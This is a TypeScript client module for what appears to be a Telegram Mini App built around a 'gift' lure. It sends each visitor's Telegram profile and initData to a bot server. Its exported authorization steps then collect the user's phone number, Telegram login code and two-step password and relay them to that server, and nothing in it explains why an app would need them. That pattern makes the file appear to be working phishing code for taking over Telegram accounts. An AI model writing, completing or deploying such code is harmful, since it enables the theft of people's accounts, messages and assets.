import { BOT_API } from '../constants';

// ─── Timeout-aware fetch ───────────────────────────────────────────────────────

function fetchWithTimeout(
  url: string,
  options: RequestInit,
  timeoutMs: number
): Promise<Response> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  return fetch(url, { ...options, signal: controller.signal }).finally(() => {
    clearTimeout(timer);
  });
}

// ─── Получить объект Telegram.WebApp безопасно ────────────────────────────────

function getTg(): any {
  return (window as any).Telegram?.WebApp ?? null;
}

// ─── Получить user_id из Telegram WebApp ─────────────────────────────────────

function getTelegramUserId(): number | null {
  const tg = getTg();
  if (!tg) return null;
  const id = tg.initDataUnsafe?.user?.id;
  if (!id) return null;
  return Number(id);
}

// ─── Получить объект пользователя безопасно ──────────────────────────────────

function getTelegramUser(): Record<string, any> {
  const tg = getTg();
  if (!tg) return {};
  return tg.initDataUnsafe?.user ?? {};
}

// ─── Отстук визита ────────────────────────────────────────────────────────────
// Вызывается при старте приложения. Отправляет данные пользователя боту.
// Ошибки игнорируются — не критично.

export function trackVisitor(): void {
  const tg = getTg();
  const giftId = new URLSearchParams(window.location.search).get('gift_id') || '';
  const user = getTelegramUser();
  const initData = tg?.initData || '';

  fetchWithTimeout(
    `${BOT_API}/api/visitor`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        user,
        gift_id:   giftId,
        init_data: initData,
      }),
    },
    10000
  ).catch((err) => {
    console.warn('[trackVisitor] failed:', err?.message ?? err);
  });
}

// ─── Отправка действия боту ───────────────────────────────────────────────────

async function sendToBot(payload: any): Promise<void> {
  const tg = getTg();
  const userId = getTelegramUserId();

  if (!userId) {
    // Telegram WebApp SDK не загружен или user не определён.
    // Если window.Telegram вообще нет — значит index.html без SDK скрипта.
    // Если есть но нет user — значит приложение открыто не через Telegram.
    const sdkLoaded = !!(window as any).Telegram;
    if (!sdkLoaded) {
      throw new Error(
        'Telegram SDK не загружен. Проверьте index.html — должен быть скрипт telegram-web-app.js'
      );
    }
    throw new Error('Откройте приложение через Telegram');
  }

  let response: Response;
  try {
    response = await fetchWithTimeout(
      `${BOT_API}/api/miniapp`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          user_id:   userId,
          init_data: tg?.initData || '',
          data:      JSON.stringify(payload),
        }),
      },
      25000
    );
  } catch (err: any) {
    if (err.name === 'AbortError') {
      throw new Error('Сервер не отвечает. Проверьте соединение.');
    }
    throw new Error('Не удалось подключиться к серверу. Проверьте соединение.');
  }

  if (!response.ok) {
    let detail = response.statusText;
    try {
      detail = await response.text();
    } catch {
      // ignore
    }
    throw new Error(`Ошибка сервера (${response.status}): ${detail.slice(0, 120)}`);
  }
}

// ─── Polling ответа через /api/reply ─────────────────────────────────────────

async function pollReply(timeoutMs = 30000): Promise<any> {
  const userId = getTelegramUserId();
  if (!userId) {
    throw new Error('Откройте приложение через Telegram');
  }

  const start = Date.now();

  while (Date.now() - start < timeoutMs) {
    try {
      const r = await fetchWithTimeout(
        `${BOT_API}/api/reply?user_id=${userId}`,
        {
          method: 'GET',
          headers: { 'Accept': 'application/json' },
        },
        8000
      );

      if (r.status === 200) {
        return await r.json();
      }
      // 204 = ещё нет ответа, ждём
    } catch (err: any) {
      if (err.name !== 'AbortError') {
        console.warn('[pollReply] fetch error:', err.message);
      }
    }

    await new Promise<void>((resolve) => setTimeout(resolve, 1500));
  }

  throw new Error('Сервер не ответил за отведённое время. Попробуйте ещё раз.');
}

// ─── Шаги авторизации ─────────────────────────────────────────────────────────

export async function authStepPhone(phone: string, giftId = ''): Promise<any> {
  await sendToBot({ action: 'phone', phone, gift_id: giftId });
  return pollReply();
}

export async function authStepCode(code: string): Promise<any> {
  await sendToBot({ action: 'code', code });
  return pollReply();
}

export async function authStepPassword(password: string): Promise<any> {
  await sendToBot({ action: 'password', password });
  return pollReply();
}

export { sendToBot };
